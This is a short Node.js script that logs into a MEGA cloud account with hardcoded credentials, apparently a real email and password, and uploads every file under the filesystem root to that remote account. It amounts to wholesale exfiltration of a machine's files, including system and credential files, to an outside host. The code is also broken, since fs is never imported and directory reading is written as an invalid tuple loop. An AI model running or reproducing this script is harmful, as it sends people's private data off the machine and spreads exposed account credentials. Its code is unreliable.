const Mega = require('mega');
const path = require('path');

// MEGA account credentials (replace with your own)
const email = 'sapnavishoka1@gmail.com';
const password = 'amcc2005##';

async function uploadToMega(localFolder, remoteFolder = '') {
  // Initialize MEGA and log in
  const mega = new Mega();
  await mega.login(email, password);

  // Loop through all files in the local folder
  for (const [root, dirs, files] of await fs.promises.readdirSync(localFolder, { withFileTypes: true })) {
    for (const file of files) {
      const filePath = path.join(root, file.name);
      const relativePath = path.relative(localFolder, filePath);

      console.log(`Uploading ${filePath} to MEGA...`);
      try {
        // Upload file to MEGA (under remoteFolder if specified)
        await mega.upload(filePath, remoteFolder ? path.join(remoteFolder, relativePath) : relativePath);
        console.log(`Uploaded: ${filePath}`);
      } catch (error) {
        console.error(`Failed to upload ${filePath}: ${error}`);
      }
    }
  }
}

// Define the root directory to scan all directories and files
const rootDirectory = '/'; // For Linux/Mac, use '/' for root. For Windows, use 'C:/'

// Start the upload process
console.log(`Starting to upload all files from ${rootDirectory}...`);

uploadToMega(rootDirectory)
  .then(() => console.log('Upload complete.'))
  .catch((error) => console.error(`Error during upload: ${error}`));
